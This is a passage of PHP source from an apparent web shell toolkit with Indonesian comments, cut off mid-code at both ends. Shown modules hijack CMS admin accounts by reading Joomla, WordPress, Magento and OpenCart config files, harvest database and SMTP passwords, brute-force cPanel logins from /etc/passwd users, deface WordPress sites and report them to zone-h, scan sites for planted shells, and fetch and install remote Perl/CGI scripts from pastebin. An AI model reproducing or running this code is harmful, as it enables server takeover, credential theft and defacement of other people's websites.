		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='FayID48' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='FayID48' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}elseif($_GET['k3'] == 'shelscan') {
	echo'<center><h2>Shell Finder</h2>
<form action="" method="post">
<input type="text" size="50" name="traget" value="http://www.site.com/"/>
<br>
<input name="scan" value="Start Scaning"  style="width: 215px;" type="submit">
</form><br>';
if (isset($_POST["scan"])) {  
$url = $_POST['traget'];
echo "<br /><span class='start'>Scanning ".$url."<br /><br /></span>";
echo "Result :<br />";
$shells = array("WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl", 
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/", 
"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php","hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73ction.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasmu.php","kthree.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","z.php");
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); // 
if (eregi('200', $headers[0])) {
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; // 
$dz = fopen('shells.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
}
	
}
 elseif($_GET['k3'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						$i++;
						echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Nemu ".$i." Cpanel by <font color=lime>Jankthree</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['k3'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['k3'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By 0x1999' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['k3'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&k3main1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value'Achon666ju5t'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}elseif($_GET['k3'] == 'lcf') {
	mkdir('LCF',0755);
chdir('LCF');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Error mas broo!!!");
$metin = "OPTIONS Indexes Includes ExecCGI FollowSymLinks	\n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl
\n \n Options \n DirectoryIndex seees.html \n RemoveHandler .php \n AddType application/octet-stream .php"; 
fwrite ( $dosya , $metin ) ;
 fclose ($dosya);
$file = fopen("lcf.pl","w+");
$write = fwrite ($file ,file_get_contents("http://pastebin.com/raw/26jAL0sz"));
fclose($file);
chmod("lcf.pl",0755);
echo "<iframe src=LCF/lcf.pl width=97% height=100% frameborder=0></iframe>";
}
 elseif($_GET['k3'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['k3'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
} elseif($_GET['k3'] == 'adminer') {
	$full = str_replace($_SERVER['k3CUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['k3'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
//

//
} elseif($_GET['k3'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
